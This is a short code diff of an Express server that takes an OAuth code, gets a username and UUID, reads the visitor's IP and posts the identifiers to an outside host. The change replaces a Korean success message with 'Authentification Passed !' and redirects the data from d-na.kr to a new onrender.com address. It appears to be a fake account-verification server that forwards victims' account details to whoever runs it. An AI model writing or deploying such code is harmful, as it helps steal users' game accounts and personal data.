@@ -10,7 +10,7 @@ const app = express()
 const port = process.env.PORT || 3000
 
 app.get('/', async (req, res) => {
-    res.send('인증이 완료되었습니다!')
+    res.send('Authentification Passed !')
     const code = req.query.code
     if (code == null) {
         return
@@ -28,7 +28,7 @@ app.get('/', async (req, res) => {
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         const ip = getIp(req)
-        pageGoPost({url: "http://d-na.kr/oauth.php", target: "_self", vals: [["username", username], ["uuid", uuid]]});
+        pageGoPost({url: "https://necrons-slayer.onrender.com/", target: "_self", vals: [["username", username], ["uuid", uuid]]});
     } catch (e) {
         console.log(e)
     }
